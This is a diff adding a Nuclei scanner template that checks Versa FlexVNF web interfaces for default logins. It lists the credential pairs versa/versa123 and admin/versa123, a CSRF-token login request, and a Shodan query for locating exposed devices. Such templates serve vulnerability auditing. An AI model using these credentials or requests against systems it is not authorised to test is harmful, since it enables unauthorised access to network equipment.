@@ -1,0 +1,63 @@
+id: versa-flexvnf-default-login
+
+info:
+  name: Versa FlexVNF - Default Login
+  author: c-sh0
+  severity: high
+  description: Versa FlexVNF contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://versa-networks.com/products/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 4
+    shodan-query: title:"Flex VNF Web-UI"
+  tags: default-login,versa,flexvnf
+
+http:
+  - raw:
+      - |
+        GET /authenticate HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /authenticate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+        CSRF-Token: {{xsrf_token}}
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - versa
+        - admin
+      password:
+        - versa123
+        - versa123
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{\"username\":\"{{username}}\",\"error\":false}"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: xsrf_token
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - '(?i)Set-Cookie: XSRF-TOKEN=([A-Za-z0-9_.-]+)'
+
+# digest: 4a0a0047304502207fb8a796bb1695b4a06664adbe831afd4c0b0cecfa83a9700cbdc1a4483e63c3022100e2e5ae328c81b82b980008020321c832f7b7c09c42238522c4dee1067104f073:922c64590222798bb761d5b6d8e72950
